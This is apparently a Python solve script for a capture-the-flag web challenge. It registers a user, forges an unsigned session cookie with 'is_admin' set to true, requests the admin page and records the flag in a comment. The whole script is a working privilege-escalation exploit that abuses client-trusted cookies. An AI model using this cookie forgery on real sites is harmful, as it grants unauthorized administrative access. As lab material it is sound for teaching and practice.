import requests
from urllib.parse import quote

site = "http://useless-panel.challs.olicyber.it"

data = {
    "password" : "manamvnamn" ,
    "username" : "manamvnamn"
}
register = requests.post(f"{site}/api/register", data=data)

login = requests.post(f"{site}/api/login", data = data)

cookie = """{"user":{"username":"manamvnamn","manamvnamn":"Ciao1234","is_admin":true,"description":null,"notes":["aa","a"]}}"""
encoded_cookie = quote(cookie)

admin = requests.get(f"{site}/admin", cookies = {"session" : encoded_cookie}).text
print(admin)

#flag{never_trust_user_provided_cookies}